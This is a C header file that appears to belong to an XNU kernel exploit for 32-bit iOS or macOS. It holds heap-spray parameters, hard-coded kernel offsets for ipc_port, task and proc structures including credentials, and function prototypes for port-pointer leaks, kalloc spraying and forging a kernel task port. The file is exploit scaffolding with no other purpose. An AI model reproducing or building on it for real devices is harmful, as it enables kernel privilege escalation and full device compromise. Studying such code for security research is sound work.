#ifndef MACH_PORTS_H
#define MACH_PORTS_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <mach/mach.h>
#include <IOKit/IOKitLib.h>

#define N_BEFORE_PORTS 0x2800
#define N_AFTER_PORTS 0x1400
#define N_SPRAY_PORTS 47000

#define SIZEOF_VM_MAP_HEADER 52 // 50-54 
#define KALLOC_4096 0x1000 - SIZEOF_VM_MAP_HEADER

// 8 * 4 B = 32 B -> Allocation in kalloc.32
#define N_PORTS_LEAK 8

#define N_OOL_PORTS_DESCRIPTOR 0x190

// struct offsets

#define IO_BITS_PORT_OFFSET 0x00
#define IO_REFERENCES_PORT_OFFSET 0x04
#define IO_LOCK_TYPE_PORT_OFFSET 0x10
#define IP_RECEIVER_PORT_OFFSET 0x40
#define KOBJECT_PORT_OFFSET 0x44
#define IP_CONTEXT_PORT_OFFSET 104
#define IP_SRIGHTS_PORT_OFFSET 92

#define LOCK_TYPE_TASK_OFFSET 0x08
#define REFCOUNT_TASK_OFFSET 0x0C
#define ACTIVE_TASK_OFFSET 0x10
#define VM_MAP_TASK_OFFSET 0x18
#define BSD_INFO_TASK_OFFSET 0x1E8

#define NEXT_PROC_OFFSET 0x00
#define PREV_PROC_OFFSET 0x04
#define PID_PROC_OFFSET 0x08
#define TASK_PROC_OFFSET 0xC
#define UCRED_PROC_OFFSET 0x23

#define IS_TASK_IPC_SPACE_OFFSET 0x18

#define	IO_BITS_ACTIVE		0x80000000	/* is object alive? */

#define	IKOT_TASK				2

#define KERNEL_PID 0
#define LAUNCHD_PID 1

#define MAGIC_CONSTANT 0xdeadbeef

struct ool_leak_msg {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports[];
};

typedef struct ool_leak_msg * ool_leak_msg_t;

int prepare_ports(mach_port_t *receive_port, mach_port_t *target_port, 
        mach_port_t *own_task_port, mach_port_t **before_ports,
        mach_port_t **after_ports, mach_port_t **spray_ports);
int spray_port_pointer(mach_port_t receive_port, mach_port_t target_port, mach_port_t other_port);
int spray_null_port_pointer(mach_port_t receive_port);
void destroy_ports(mach_port_t receive_port, mach_port_t *before_ports, mach_port_t *after_ports);
int spray_kalloc_4096(mach_port_t *spray_ports, mach_port_t target_port,
				    uint32_t port_offset, int *port_number);

uint32_t get_port_offset(uint32_t port_pointer);
uint32_t get_port_page(uint32_t port_pointer);

int ool_descriptor_spray(mach_port_t *spray_port, uint8_t *data, size_t data_size);

int create_kernel_task_port(int read_fd, int write_fd, uint32_t port_offset,
			    uint32_t port_address, mach_port_t *target_port,
			    uint32_t host_pointer);

#endif /* ! MACH_PORTS_H */